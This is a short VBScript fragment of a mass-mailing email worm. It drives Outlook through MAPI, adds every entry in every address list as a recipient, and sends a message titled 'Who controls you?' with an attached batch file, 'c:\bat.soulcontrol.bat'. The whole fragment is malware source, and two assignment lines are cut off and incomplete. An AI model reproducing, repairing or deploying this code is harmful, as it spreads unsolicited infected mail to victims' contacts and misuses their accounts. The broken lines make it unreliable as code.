on error resume next
dim a,b,c,d,e
set a = Wscript.CreateObject("Wscript.Shell")
set b = CreateObject("Outlook.Application")
set c = b.GetNameSpace("MAPI")
for y = 1 To c.AddressLists.Count
set d = c.AddressLists(y)
x = 
set e = b.CreateItem(0)
for o = 1 To d.AddressEntries.Count
f = d.AddressEntries(x)
e.Recipients.Add f
x = x + 
next
e.Subject = "Who controls you?"
e.Body = "Stop your soul being controled! Get illuminated."
e.Attachments.Add ("c:\bat.soulcontrol.bat")
e.DeleteAfterSubmit = False
e.Send
f = ""
next
